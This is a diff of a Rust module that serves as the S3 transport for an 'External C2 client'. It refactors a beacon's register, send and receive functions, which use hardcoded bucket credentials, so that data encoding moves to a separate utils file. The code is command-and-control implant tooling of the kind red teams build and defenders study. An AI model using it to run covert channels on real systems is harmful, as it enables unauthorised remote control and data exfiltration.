@@ -1,11 +1,7 @@
 //! S3-based transport layer for the External C2 client.
 //!
-//! All S3 interaction details (credentials, encoding, bucket operations) are
-//! encapsulated here.  Only three functions are exported for use by `main.rs`:
-//!
-//! - [`register_beacon`] – register a new agent with the C2
-//! - [`send_data`]       – send data (beacon → C2) via S3
-//! - [`recv_data`]       – receive tasks (C2 → beacon) via S3
+//! Handles raw I/O only — no encoding/decoding.
+//! Encoding is handled by the wrapper functions in `utils.rs`.
 
 use std::time::Duration;
 
@@ -14,8 +10,6 @@ use s3::creds::Credentials;
 use s3::Region;
 use tokio::time::sleep;
 use uuid::Uuid;
-
-use crate::utils::{data_encode, data_decode};
 
 // ── Configuration ───────────────────────────────────────────────────────────
 
@@ -84,20 +78,18 @@ impl S3Client {
 // ── Transport handle ────────────────────────────────────────────────────────
 
 /// Opaque handle that holds the S3 client and the key-name prefixes derived
-/// from the beacon ID.  Created by [`register_beacon`] and passed into
-/// [`send_data`] / [`recv_data`].
+/// from the beacon ID.
 pub struct S3Transport {
     s3: S3Client,
     task_key_name: String,
     resp_key_name: String,
 }
 
-// ── Public API (only 3 functions) ───────────────────────────────────────────
+// ── Public API (raw I/O — no encoding) ──────────────────────────────────────
 
 /// Register a new beacon agent with the C2 server via S3.
 ///
-/// Returns an [`S3Transport`] handle that must be passed to [`send_data`] and
-/// [`recv_data`].
+/// Writes a registration marker and returns an [`S3Transport`] handle.
 pub async fn register_beacon(beacon_id: &str) -> Result<S3Transport, Box<dyn std::error::Error>> {
     let s3 = S3Client::new_hardcoded(
         AWS_BUCKET_NAME,
@@ -121,18 +113,17 @@ pub async fn register_beacon(beacon_id: &str) -> Result<S3Transport, Box<dyn std
     })
 }
 
-/// Send data (typically a beacon response chunk) to the C2 server via S3.
+/// Send raw (already-encoded) data to the C2 server via S3.
 pub async fn send_data(transport: &S3Transport, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
     let resp_key = format!("{}:{}", transport.resp_key_name, Uuid::new_v4());
-    let body = data_encode(data);
-    transport.s3.put_object(&resp_key, body.as_bytes()).await?;
+    transport.s3.put_object(&resp_key, data).await?;
     Ok(())
 }
 
-/// Receive task data from the C2 server via S3.
+/// Receive raw (still-encoded) data from the C2 server via S3.
 ///
 /// Blocks (polling every 10 s) until at least one task object appears, then
-/// returns all available tasks as a `Vec<Vec<u8>>`.
+/// returns all available tasks as raw `Vec<Vec<u8>>`.
 pub async fn recv_data(transport: &S3Transport) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
     loop {
         let keys = transport.s3.list_objects(&transport.task_key_name).await?;
@@ -146,10 +137,8 @@ pub async fn recv_data(transport: &S3Transport) -> Result<Vec<Vec<u8>>, Box<dyn 
 
         for key in keys {
             let raw = transport.s3.get_object(&key).await?;
-            let raw_str = std::str::from_utf8(&raw)?;
-            let msg = data_decode(raw_str)?;
             transport.s3.delete_object(&key).await?;
-            tasks.push(msg);
+            tasks.push(raw);
         }
 
         return Ok(tasks);
